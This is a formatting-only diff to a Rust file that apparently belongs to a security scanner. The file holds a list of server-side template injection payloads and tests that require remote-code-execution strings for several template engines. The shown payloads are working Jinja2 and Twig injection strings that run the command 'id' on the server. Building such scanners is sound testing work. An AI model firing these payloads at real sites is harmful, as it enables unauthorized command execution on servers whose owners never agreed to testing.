@@ -55,13 +55,15 @@ pub static PAYLOADS: &[Payload] = &[
     },
     Payload {
         category: C,
-        value: "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}",
+        value:
+            "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}",
         notes: "Jinja2 RCE via request.application — works in modern Flask",
         tags: &["jinja2", "flask", "rce"],
     },
     Payload {
         category: C,
-        value: "{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}",
+        value:
+            "{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}",
         notes: "Twig RCE — registerUndefinedFilterCallback gadget",
         tags: &["twig", "rce"],
     },
@@ -111,7 +113,10 @@ mod tests {
 
     #[test]
     fn has_calibration_probes() {
-        let probes: Vec<_> = PAYLOADS.iter().filter(|p| p.tags.contains(&"probe")).collect();
+        let probes: Vec<_> = PAYLOADS
+            .iter()
+            .filter(|p| p.tags.contains(&"probe"))
+            .collect();
         assert!(probes.len() >= 4);
     }
 
@@ -120,7 +125,9 @@ mod tests {
         let engines = ["jinja2", "twig", "spring", "freemarker", "erb"];
         for e in engines {
             assert!(
-                PAYLOADS.iter().any(|p| p.tags.contains(&"rce") && p.tags.contains(&e)),
+                PAYLOADS
+                    .iter()
+                    .any(|p| p.tags.contains(&"rce") && p.tags.contains(&e)),
                 "no RCE payload for engine {}",
                 e
             );
